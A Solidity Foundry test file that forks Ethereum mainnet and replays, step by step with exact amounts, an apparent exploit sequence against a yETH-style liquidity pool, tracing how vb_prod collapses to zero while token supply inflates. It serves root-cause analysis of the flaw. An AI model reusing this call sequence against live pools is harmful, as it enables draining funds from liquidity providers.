// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IPool} from "./interfaces/IPool.sol";
import "forge-std/Test.sol";

/**
 * @title VbProdAnalysis
 * @notice This test validates WHY vb_prod becomes 0 during add_liquidity
 *
 * HYPOTHESIS: vb_prod underflows to 0 because:
 * 1. In add_liquidity line 474: vb_prod_final = vb_prod_final * _pow_up(prev_vb/vb, wn) / PRECISION
 * 2. When adding liquidity, vb > prev_vb, so prev_vb/vb < 1
 * 3. With large wn exponents and repeated operations, the product eventually underflows to 0
 *
 * This test will:
 * 1. Track vb_prod after each add_liquidity call
 * 2. Show the progression toward 0
 * 3. Demonstrate that the product term multiplication causes the underflow
 */
contract VbProdAnalysisTest is Test {
    IPool public localPool;
    IPool public constant POOL = IPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 public constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);

    function setUp() public virtual {
        uint256 _blockNumber = 23914085;
        vm.selectFork(vm.createFork(vm.envString("ETH_RPC_URL"), _blockNumber));

        // Deploy local Pool with same parameters
        address[] memory _assets = new address[](8);
        _assets[0] = 0xac3E018457B222d93114458476f3E3416Abbe38F; // sfrxETH
        _assets[1] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // wstETH
        _assets[2] = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b; // ETHx
        _assets[3] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        _assets[4] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        _assets[5] = 0x9Ba021B0a9b958B5E75cE9f6dff97C7eE52cb3E6; // apxETH
        _assets[6] = 0xDcEe70654261AF21C44c093C300eD3Bb97b78192; // WOETH
        _assets[7] = 0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa; // mETH

        address[] memory _rateProviders = new address[](8);
        for (uint i = 0; i < 8; i++) {
            _rateProviders[i] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        }

        uint256[] memory _weights = new uint256[](8);
        _weights[0] = 200000000000000000; // 20%
        _weights[1] = 200000000000000000; // 20%
        _weights[2] = 100000000000000000; // 10%
        _weights[3] = 100000000000000000; // 10%
        _weights[4] = 100000000000000000; // 10%
        _weights[5] = 250000000000000000; // 25%
        _weights[6] = 25000000000000000;  // 2.5%
        _weights[7] = 25000000000000000;  // 2.5%

        localPool = IPool(deployCode("Pool", abi.encode(
            address(YETH),
            450000000000000000000, // amplification = 450
            _assets,
            _rateProviders,
            _weights
        )));

        vm.etch(address(POOL), address(localPool).code);
    }

    /**
     * @notice Test that traces vb_prod step by step to show WHY it becomes 0
     */
    function test_trace_vb_prod_underflow() public {
        address attacker = address(69);
        vm.startPrank(attacker);

        // Setup tokens
        for (uint256 i = 0; i < 8; i++) {
            address asset = POOL.assets(i);
            deal(asset, attacker, 100_000e18);
            IERC20(asset).approve(address(POOL), type(uint256).max);
        }

        // Initial rate update
        uint256[] memory rates = new uint256[](8);
        rates[0] = 0; rates[1] = 1; rates[2] = 2; rates[3] = 3;
        rates[4] = 4; rates[5] = 5; rates[6] = 0; rates[7] = 0;
        POOL.update_rates(rates);

        console.log("=== TRACING vb_prod UNDERFLOW ===");
        console.log("");

        (uint256 prod, uint256 sum) = POOL.vb_prod_sum();
        console.log("Initial state:");
        console.log("  vb_prod:", prod);
        console.log("  vb_sum:", sum);
        console.log("");

        // Log virtual balances for each asset
        console.log("Initial virtual balances:");
        for (uint256 i = 0; i < 8; i++) {
            uint256 vb = POOL.virtual_balance(i);
            console.log("  Asset", i, "vb:", vb);
        }
        console.log("");

        // First remove some liquidity to set up state
        uint256 firstRemoveYeth = 416373487230773958294;
        deal(address(YETH), attacker, firstRemoveYeth);
        YETH.approve(address(POOL), type(uint256).max);
        POOL.remove_liquidity(firstRemoveYeth, new uint256[](8), attacker);

        (prod, sum) = POOL.vb_prod_sum();
        console.log("After first remove_liquidity:");
        console.log("  vb_prod:", prod);
        console.log("  vb_sum:", sum);
        console.log("");

        // Now do the add_liquidity calls and track vb_prod
        uint256[] memory addAmounts = new uint256[](8);

        // First add_liquidity
        addAmounts[0] = 610669608721347951666;
        addAmounts[1] = 777507145787198969404;
        addAmounts[2] = 563973440562370010057;
        addAmounts[3] = 0;
        addAmounts[4] = 476460390272167461711;
        addAmounts[5] = 0;
        addAmounts[6] = 0;
        addAmounts[7] = 0;

        console.log("ADD_LIQUIDITY #1 - amounts:");
        console.log("  [0] sfrxETH:", addAmounts[0]);
        console.log("  [1] wstETH:", addAmounts[1]);
        console.log("  [2] ETHx:", addAmounts[2]);
        console.log("  [3] cbETH:", addAmounts[3], "(ZERO)");
        console.log("  [4] rETH:", addAmounts[4]);
        console.log("  [5] apxETH:", addAmounts[5], "(ZERO)");
        console.log("  [6] WOETH:", addAmounts[6], "(ZERO)");
        console.log("  [7] mETH:", addAmounts[7], "(ZERO)");

        POOL.add_liquidity(addAmounts, 0, attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("  RESULT vb_prod:", prod);
        console.log("  RESULT vb_sum:", sum);
        console.log("");

        // Remove liquidity
        POOL.remove_liquidity(2789348310901989968648, new uint256[](8), attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("After remove_liquidity: vb_prod:", prod, "vb_sum:", sum);
        console.log("");

        // Second add_liquidity
        addAmounts[0] = 1636245238220874001286;
        addAmounts[1] = 1531136279659070868194;
        addAmounts[2] = 1041815511903532551187;
        addAmounts[3] = 0;
        addAmounts[4] = 991050908418104947336;
        addAmounts[5] = 1346008005663580090716;
        addAmounts[6] = 0;
        addAmounts[7] = 0;

        console.log("ADD_LIQUIDITY #2");
        POOL.add_liquidity(addAmounts, 0, attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("  RESULT vb_prod:", prod);
        console.log("");

        // Remove
        POOL.remove_liquidity(7379203011929903830039, new uint256[](8), attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("After remove: vb_prod:", prod);
        console.log("");

        // Third add_liquidity
        addAmounts[0] = 1630811661792970363090;
        addAmounts[1] = 1526051744772289698092;
        addAmounts[2] = 1038108768586660585581;
        addAmounts[3] = 0;
        addAmounts[4] = 969651157511131341121;
        addAmounts[5] = 1363135138655820584263;
        addAmounts[6] = 0;
        addAmounts[7] = 0;

        console.log("ADD_LIQUIDITY #3");
        POOL.add_liquidity(addAmounts, 0, attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("  RESULT vb_prod:", prod);
        console.log("");

        // Remove
        POOL.remove_liquidity(7066638371690257003757, new uint256[](8), attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("After remove: vb_prod:", prod);
        console.log("");

        // Fourth add_liquidity
        addAmounts[0] = 859805263416698094503;
        addAmounts[1] = 804573178584505833740;
        addAmounts[2] = 546933182262586953508;
        addAmounts[3] = 0;
        addAmounts[4] = 510865922059584325991;
        addAmounts[5] = 723182384178548055243;
        addAmounts[6] = 0;
        addAmounts[7] = 0;

        console.log("ADD_LIQUIDITY #4");
        POOL.add_liquidity(addAmounts, 0, attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("  RESULT vb_prod:", prod);
        console.log("");

        // Remove
        POOL.remove_liquidity(3496158478994807127953, new uint256[](8), attacker);
        (prod, sum) = POOL.vb_prod_sum();
        console.log("After remove: vb_prod:", prod);
        console.log("");

        // Fifth add_liquidity - THIS IS WHERE vb_prod BECOMES 0
        addAmounts[0] = 1784169320136805803209;
        addAmounts[1] = 1669558029141448703194;
        addAmounts[2] = 1135991585797559066395;
        addAmounts[3] = 0;
        addAmounts[4] = 1061079136814511050837;
        addAmounts[5] = 1488254960317842892500;
        addAmounts[6] = 0;
        addAmounts[7] = 0;

        console.log("ADD_LIQUIDITY #5 - THE CRITICAL ONE");
        console.log("  Adding large amounts to assets 0,1,2,4,5");
        console.log("  Assets 3,6,7 are ZERO");

        // Log virtual balances before
        console.log("  Virtual balances BEFORE add:");
        for (uint256 i = 0; i < 8; i++) {
            uint256 vb = POOL.virtual_balance(i);
            console.log("    Asset", i, ":", vb);
        }

        uint256 vb_prod_before = prod;
        POOL.add_liquidity(addAmounts, 0, attacker);
        (prod, sum) = POOL.vb_prod_sum();

        console.log("");
        console.log("  vb_prod BEFORE:", vb_prod_before);
        console.log("  vb_prod AFTER:", prod);

        if (prod == 0) {
            console.log("");
            console.log("  >>> vb_prod IS NOW ZERO! <<<");
            console.log("");
            console.log("  EXPLANATION:");
            console.log("  In add_liquidity line 474:");
            console.log("    vb_prod = vb_prod * _pow_up(prev_vb/vb, wn) / PRECISION");
            console.log("");
            console.log("  When adding liquidity:");
            console.log("    - vb increases (new > prev)");
            console.log("    - prev_vb/vb < 1");
            console.log("    - (prev_vb/vb)^wn becomes very small");
            console.log("    - Eventually rounds down to 0");
        }

        // Show virtual balances after
        console.log("");
        console.log("  Virtual balances AFTER add:");
        for (uint256 i = 0; i < 8; i++) {
            uint256 vb = POOL.virtual_balance(i);
            console.log("    Asset", i, ":", vb);
        }

        console.log("");
        console.log("=== ANALYSIS COMPLETE ===");
    }


    /**
     * @notice Programmatically prove: vb_prod after pow-up updates is small-but-nonzero, then _calc_supply zeroes it.
     */
    function test_calc_supply_zeroes_small_prod() public {
        address attacker = address(69);
        vm.startPrank(attacker);

        for (uint256 i = 0; i < 8; i++) {
            address asset = POOL.assets(i);
            deal(asset, attacker, 100_000e18);
            IERC20(asset).approve(address(POOL), type(uint256).max);
        }

        // Initial rate update
        uint256[] memory rates = new uint256[](8);
        rates[0] = 0; rates[1] = 1; rates[2] = 2; rates[3] = 3;
        rates[4] = 4; rates[5] = 5; rates[6] = 0; rates[7] = 0;
        POOL.update_rates(rates);

        // Remove, then four add/remove rounds to reach the critical fifth add state
        uint256 firstRemoveYeth = 416373487230773958294;
        deal(address(YETH), attacker, firstRemoveYeth);
        YETH.approve(address(POOL), type(uint256).max);
        POOL.remove_liquidity(firstRemoveYeth, new uint256[](8), attacker);

        uint256[] memory addAmounts = new uint256[](8);

        addAmounts[0] = 610669608721347951666;
        addAmounts[1] = 777507145787198969404;
        addAmounts[2] = 563973440562370010057;
        addAmounts[3] = 0;
        addAmounts[4] = 476460390272167461711;
        addAmounts[5] = 0;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(2789348310901989968648, new uint256[](8), attacker);

        addAmounts[0] = 1636245238220874001286;
        addAmounts[1] = 1531136279659070868194;
        addAmounts[2] = 1041815511903532551187;
        addAmounts[3] = 0;
        addAmounts[4] = 991050908418104947336;
        addAmounts[5] = 1346008005663580090716;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(7379203011929903830039, new uint256[](8), attacker);

        addAmounts[0] = 1630811661792970363090;
        addAmounts[1] = 1526051744772289698092;
        addAmounts[2] = 1038108768586660585581;
        addAmounts[3] = 0;
        addAmounts[4] = 969651157511131341121;
        addAmounts[5] = 1363135138655820584263;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(7066638371690257003757, new uint256[](8), attacker);

        addAmounts[0] = 859805263416698094503;
        addAmounts[1] = 804573178584505833740;
        addAmounts[2] = 546933182262586953508;
        addAmounts[3] = 0;
        addAmounts[4] = 510865922059584325991;
        addAmounts[5] = 723182384178548055243;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(3496158478994807127953, new uint256[](8), attacker);

        // State just before critical add #5
        (uint256 prevProd, uint256 prevSum) = POOL.vb_prod_sum();
        uint256 prevSupply = POOL.supply();
        console.log("=== Pre-fifth add state ===");
        console.log("vb_prod", prevProd);
        console.log("vb_sum", prevSum);
        console.log("supply", prevSupply);
        for (uint256 i = 0; i < 8; i++) {
            console.log("vb[", i, "]", POOL.virtual_balance(i));
        }

        addAmounts[0] = 1784169320136805803209;
        addAmounts[1] = 1669558029141448703194;
        addAmounts[2] = 1135991585797559066395;
        addAmounts[3] = 0;
        addAmounts[4] = 1061079136814511050837;
        addAmounts[5] = 1488254960317842892500;
        addAmounts[6] = 0;
        addAmounts[7] = 0;

        // Reconstruct vb_prod_final using the exact pow-up update per asset (no fees in this branch)
        uint256 numAssets = POOL.num_assets();
        uint256 prodAfterPow = prevProd;
        uint256 sumAfterPow = prevSum;
        for (uint256 i = 0; i < numAssets; i++) {
            uint256 amount = addAmounts[i];
            if (amount == 0) continue;
            uint256 prevVb = POOL.virtual_balance(i);
            uint256 rate = POOL.rate(i);
            uint256 dvb = amount * rate / 1e18;
            prodAfterPow = POOL.debug_vb_prod_step(prevVb, prevVb + dvb, POOL.packed_weight(i), prodAfterPow, numAssets);
            sumAfterPow += dvb;
        }
        console.log("vb_prod after pow-up (expected tiny, non-zero)", prodAfterPow);
        console.log("vb_sum after pow-up", sumAfterPow);

        // Assert the pow-up stage keeps vb_prod > 0 and matches expected ballpark (~3.5e15)
        assertGt(prodAfterPow, 0);
        assertApproxEqAbs(prodAfterPow, 3_527_551_366_992_573, 1e9); // allow small rounding wiggle

        // Now feed that small product into the same _calc_supply used on-chain and prove it zeros the product
        (uint256 newSupply, uint256 prodAfterCalc) = POOL.debug_calc_supply(prevSupply, prodAfterPow, sumAfterPow, true);
        console.log("calc_supply output supply", newSupply);
        console.log("calc_supply output vb_prod", prodAfterCalc);
        assertEq(prodAfterCalc, 0, "calc_supply should truncate product to zero");
        assertGt(newSupply, prevSupply, "supply inflated while product collapsed");

        // Prove precisely where r goes to zero: in the second iteration of calc_supply's r = r * sp / s loop
        (uint256 sp0, uint256 r0, uint256 sp1, uint256 r1) = POOL.debug_calc_supply_two_iters(prevSupply, prodAfterPow, sumAfterPow);
        console.log("calc_supply iter1 sp0", sp0, "r0", r0);
        console.log("calc_supply iter2 sp1", sp1, "r1", r1);
        assertApproxEqAbs(sp0, 10_927_432_528_352_263_698_952, 1_000_000_000_000, "first iteration supply (sp0) mismatch");
        assertGt(r0, 0, "r should be non-zero after first iteration");
        assertApproxEqAbs(sp1, 442_133_785_438_299_819, 10_000_000, "second iteration supply (sp1) mismatch");
        assertEq(r1, 0, "r should be truncated to zero in second iteration");
    }
}
